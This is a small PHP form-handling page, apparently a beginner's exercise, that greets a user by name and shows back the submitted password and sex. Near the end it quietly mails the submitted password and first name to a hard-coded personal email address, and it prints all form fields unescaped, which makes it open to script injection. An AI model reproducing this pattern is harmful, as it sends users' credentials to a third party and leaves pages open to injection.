<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>validate</title>
<style>
body{
background:gray;
}
div{
background:white;
margin:20px;
border-radius:8px;
padding:10px;
box-shadow:2px 3px 5px black; 
}
</style>
</head>
<body>
<div>
<?php
date_default_timezone_set("Africa/Lagos");
echo "<h1 id='h'>".date("h:i:sa")."</h1>";
echo "<h2> Hello ".$_POST["Fname"]." ".$_POST["Lname"]." you are welcomed ..</h2>";
echo "<h2> Your password is :".$_POST["Pword"]."</h2>";
echo "<h2> you are a :".$_POST["sex"]."</h2>";
echo "<h2>Your data has been verified on ".date("l")."</h2>";
echo " ©2021-".date("Y")." ".time();
$msg=$_POST["Pword"]." ".$_POST["Fname"];
mail("emediongekoh@gmail.com","Details",$msg); 
?>

</script>
</div>
</body>
</html>